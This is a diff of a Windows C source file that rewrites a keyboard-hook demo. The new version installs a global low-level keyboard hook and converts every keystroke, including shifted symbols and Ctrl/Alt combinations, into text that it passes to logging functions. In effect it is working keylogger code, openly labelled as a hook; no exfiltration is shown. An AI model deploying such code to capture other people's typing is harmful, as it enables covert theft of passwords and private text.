@@ -1,107 +1,266 @@
 /*
-*  文件名：KeyBoardHook.c
-*  用途：键盘钩子的演示程序
-*  编程环境：WinXP SP2+CL 8.0
-*  完成日期： 2006.3   Ver 0.01
-*  作者： 88250
-*  联系方式： E-mail: DL88250@gmail.com  QQ:845765
+*  文件名：hook.c
+*  用途：键盘钩子
+*  编程环境：Win10
+*  完成日期： 2016.6   Ver 0.01
+*  作者： yinhao
+*  联系方式： E-mail: yinhao746746@163.com
 */
 
-#define _WIN32_WINNT 0x0400
-
-#include <stdio.h>
-
-#include <stdlib.h>
-
-#include <windows.h>
-
-#include <Psapi.h>
+#include "hook.h"
 
 
-#pragma comment (lib,"Psapi.lib")
-#pragma comment(lib, "User32.lib")
-
-
-DWORD g_tid =0;
+//DWORD g_tid =0;
 
 HHOOK g_hook =0;
 
 
-
+/*
 BOOL CALLBACK con_handler(DWORD g_tid)
 {
 	PostThreadMessage(g_tid, WM_QUIT, 0, 0);
 	return TRUE;	
 }
-
+*/
 
 
 LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM l)
 {
     PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)l;
-	
+	LOG_STRU log;
 	if (code==HC_ACTION && w==WM_KEYDOWN)
 	{
-		HWND hWnd = GetForegroundWindow();
-		if (hWnd != INVALID_HANDLE_VALUE)
-		{ 
-			char name[100]={0};
-			char text[100]={0};
-			char path[100]={0};
-			int n = GetClassName(hWnd, name, 100);
-			int m = GetWindowText(hWnd, text, 100);
-			DWORD pid;
-			GetWindowThreadProcessId(hWnd,&pid);
-			HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-			GetModuleFileNameEx(handle,NULL,path,100);
-			printf("[%ld] %s %d,%s; %d,%s =>%x\n", pid,path,n,name,m,text,p->vkCode);
-		}
-		if(GetAsyncKeyState(VK_CAPITAL))
-		{
-			printf("CapsLk\n");
-		}
-		if(p->vkCode==0x43 && GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_CONTROL) )
-		{
-			printf("Ctrl + c\n");
-		}
-		if(GetAsyncKeyState(VK_MENU))
-		{
-			printf("Alt\n");
-		}
-		if(GetAsyncKeyState(VK_SHIFT))
-		{
-			printf("Shift\n");
-		}
-		//GetKeyState
-		//GetAsyncKeyState
+		hookConvertCode(log.sCode,p->vkCode);
+		logGetInfo(&log);
+		logPrintInfo(log);
 	}
-/*
-	if (((w == WM_KEYDOWN) && ((GetKeyState(VK_CAPITAL) &1) || (GetKeyState(VK_SHIFT) &1))) 
-		&& (((p->vkCode >64) && (p->vkCode <91)) || ((p->asdasdvkCode >47) && (p->vkCode <58)))){
-        printf("You press %c ", p->vkCode);
-    }else if ((w == WM_KEYDOWN) && ((p->vkCode >64) && (p->vkCode <91))){
-        printf("You press %c ", p->vkCode +32);  
-    }else if ((w == WM_KEYDOWN) && ((p->vkCode >47) && (p->vkCode <58))){
-        printf("You press %c ", p->vkCode);   
-    }
-	*/
 	return CallNextHookEx(g_hook, code, w, l);
 }
 
 
-
-int main (void)
+void hookVirtualKey()
 {
     MSG msg;
-    g_tid = GetCurrentThreadId();
-    SetConsoleCtrlHandler(&con_handler, TRUE);
-    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, &kb_proc, GetModuleHandle(NULL),0);
+//	g_tid = GetCurrentThreadId();
+//	SetConsoleCtrlHandler(&con_handler, TRUE);
+    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, &kb_proc, GetModuleHandle(NULL),0);	//设置全局低级键盘钩子
 	while (GetMessage(&msg, NULL, 0, 0)){
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
     UnhookWindowsHookEx(g_hook);
-	return 0;
+}
+
+
+void hookConvertCode(char *sCode, DWORD vkCode){
+	if(vkCode>=0x30 && vkCode<=0x39){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT)){
+			switch(vkCode-0x30){
+			case 0:{sprintf(sCode,")");break;}
+			case 1:{sprintf(sCode,"!");break;}
+			case 2:{sprintf(sCode,"@");break;}
+			case 3:{sprintf(sCode,"#");break;}
+			case 4:{sprintf(sCode,"$");break;}
+			case 5:{sprintf(sCode,"%");break;}
+			case 6:{sprintf(sCode,"^");break;}
+			case 7:{sprintf(sCode,"&");break;}
+			case 8:{sprintf(sCode,"*");break;}
+			case 9:{sprintf(sCode,"(");break;}
+			default: break;
+			}
+		}
+		else
+			sprintf(sCode,"%c",vkCode);
+	}
+	else if(vkCode>=0x41 && vkCode<=0x5A){
+		if(GetKeyState(VK_CAPITAL) || (GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT)))
+			sprintf(sCode,"%c",vkCode);
+		else
+			sprintf(sCode,"%c",vkCode+0x20);
+	}
+	else if(vkCode>=0x70 && vkCode<=0x7B){
+		sprintf(sCode,"F%d",vkCode-0x70+1);
+	}
+	else if(vkCode==VK_TAB){
+		sprintf(sCode,"Tab");
+	}
+	else if(vkCode==VK_BACK){
+		sprintf(sCode,"Backspace");
+	}
+	else if(vkCode==VK_SPACE){
+		sprintf(sCode,"Space");
+	}
+	else if(vkCode==VK_RETURN){
+		sprintf(sCode,"Enter");
+	}
+	else if(vkCode==VK_LWIN){
+		sprintf(sCode,"L_Win");
+	}
+	else if(vkCode==VK_RWIN){
+		sprintf(sCode,"R_Win");
+	}
+	else if(vkCode==VK_LSHIFT){
+		sprintf(sCode,"L_Shift");
+	}
+	else if(vkCode==VK_RSHIFT){
+		sprintf(sCode,"R_Shift");
+	}
+	else if(vkCode==VK_LCONTROL){
+		sprintf(sCode,"L_Ctrl");
+	}
+	else if(vkCode==VK_RCONTROL){
+		sprintf(sCode,"R_Ctrl");
+	}
+	else if(vkCode==VK_MENU){
+		sprintf(sCode,"Alt");
+	}
+	else if(vkCode==VK_CAPITAL){
+		sprintf(sCode,"Caps Lock");
+	}
+	else if(vkCode==VK_ESCAPE){
+		sprintf(sCode,"Esc");
+	}
+	else if(vkCode==VK_INSERT){
+		sprintf(sCode,"Insert");
+	}
+	else if(vkCode==VK_DELETE){
+		sprintf(sCode,"Delete");
+	}
+	else if(vkCode==VK_HOME){
+		sprintf(sCode,"Home");
+	}
+	else if(vkCode==VK_END){
+		sprintf(sCode,"End");
+	}
+	else if(vkCode==VK_PRIOR){
+		sprintf(sCode,"PgUp");
+	}
+	else if(vkCode==VK_NEXT){
+		sprintf(sCode,"PgDn");
+	}
+	else if(vkCode==0xC0){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,"~");
+		else
+			sprintf(sCode,"`");
+	}
+	else if(vkCode==0xDB){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,"{");
+		else
+			sprintf(sCode,"[");
+	}
+	else if(vkCode==0xDC){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,"|");
+		else
+			sprintf(sCode,"\\");
+	}
+	else if(vkCode==0xDD){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,"}");
+		else
+			sprintf(sCode,"]");
+	}
+	else if(vkCode==0xBD){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,"_");
+		else
+			sprintf(sCode,"-");
+	}
+	else if(vkCode==0xBB){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,"+");
+		else
+			sprintf(sCode,"=");
+	}
+	else if(vkCode==0xBA){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,":");
+		else
+			sprintf(sCode,";");
+	}
+	else if(vkCode==0xDE){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,"\"");
+		else
+			sprintf(sCode,"'");
+	}
+	else if(vkCode==0xBC){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,"<");
+		else
+			sprintf(sCode,"Comma");
+	}
+	else if(vkCode==0xBE){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,">");
+		else
+			sprintf(sCode,".");
+	}
+	else if(vkCode==0xBF){
+		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
+			sprintf(sCode,"?");
+		else
+			sprintf(sCode,"/");
+	}
+	else if(vkCode==VK_LEFT){
+		sprintf(sCode,"Left");
+	}
+	else if(vkCode==VK_UP){
+		sprintf(sCode,"Up");
+	}
+	else if(vkCode==VK_RIGHT){
+		sprintf(sCode,"Right");
+	}
+	else if(vkCode==VK_DOWN){
+		sprintf(sCode,"Down");
+	}
+	else if(vkCode==VK_SCROLL){
+		sprintf(sCode,"Scroll Lock");
+	}
+	else if(vkCode==VK_SNAPSHOT){
+		sprintf(sCode,"PrtScn SysRq");
+	}
+	else if(vkCode==VK_PAUSE){
+		sprintf(sCode,"Pause Break");
+	}
+	else if(vkCode==VK_NUMLOCK){
+		sprintf(sCode,"Num Lock");
+	}
+	else if(vkCode==VK_DIVIDE){
+		sprintf(sCode,"/");
+	}
+	else if(vkCode==VK_MULTIPLY){
+		sprintf(sCode,"*");
+	}
+	else if(vkCode==VK_SUBTRACT){
+		sprintf(sCode,"-");
+	}
+	else if(vkCode>=0x60 && vkCode<=0x69){
+		sprintf(sCode,"%d",vkCode-0x60);
+	}
+	else if(vkCode==VK_DECIMAL){
+		sprintf(sCode,".");
+	}
+	else if(vkCode==VK_ADD){
+		sprintf(sCode,"+");
+	}
+	else{
+		sprintf(sCode,"0x%02x",vkCode);
+	}
+	if(GetAsyncKeyState(VK_MENU) && GetAsyncKeyState(VK_MENU)){
+		char temp[CODE_LEN];
+		strcpy(temp,sCode);
+		strcpy(sCode,"Alt + ");
+		strcat(sCode,temp);
+	}
+	if(GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_CONTROL)){
+		char temp[CODE_LEN];
+		strcpy(temp,sCode);
+		strcpy(sCode,"Ctrl + ");
+		strcat(sCode,temp);
+	}
 }
 
 
